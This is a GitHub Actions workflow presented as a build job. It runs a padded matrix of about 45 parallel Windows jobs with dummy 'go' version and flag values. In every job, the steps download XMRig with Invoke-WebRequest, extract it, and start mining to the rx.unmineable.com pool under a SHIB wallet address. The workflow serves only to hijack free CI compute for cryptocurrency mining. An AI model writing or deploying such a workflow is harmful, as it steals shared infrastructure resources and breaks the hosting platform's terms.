name: NAME

on: [workflow_dispatch]

jobs:
  build:
    name: kebal
    runs-on: windows-latest
    strategy:
      max-parallel: 100
      fail-fast: false
      matrix:
        go: [1.0, 1.1, 1.2, 1.3, 1,35]
        flag: [A, B, C, D, E, F, G, H, I]
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: DOWNLOAD
      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-msvc-win64.zip -OutFile xmrig-6.15.2-msvc-win64.zip
    - name: Extract
      run: Expand-Archive xmrig-6.15.2-msvc-win64.zip
    - name: RUNNING
      run: .\xmrig-6.15.2-msvc-win64\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x49990f1e07e770fcf1d5e581e75d20c2e452e3a6.indehoi#m4rc-2ick -p x -t 2
    - name: DONE
      run: exit
